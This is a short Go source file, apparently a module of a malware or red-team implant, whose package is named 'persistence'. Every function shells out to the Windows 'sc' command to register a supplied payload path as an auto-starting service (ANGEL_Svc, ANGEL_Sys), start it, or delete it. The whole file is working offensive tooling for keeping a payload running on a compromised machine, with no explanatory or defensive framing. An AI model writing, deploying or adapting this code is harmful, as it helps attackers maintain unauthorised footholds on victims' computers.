//go:build windows

package persistence

import (
"os/exec"
)

func ServicePersist(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "sc create ANGEL_Svc binPath= \""+payloadPath+"\" start= auto")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ServicePersistSystem(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "sc create ANGEL_Sys binPath= \""+payloadPath+"\" start= auto")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ServiceStart() bool {
cmd := exec.Command("cmd", "/c", "sc start ANGEL_Svc")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ServiceDelete() bool {
cmd := exec.Command("cmd", "/c", "sc delete ANGEL_Svc")
err := cmd.Run()
if err != nil {
return false
}
return true
}
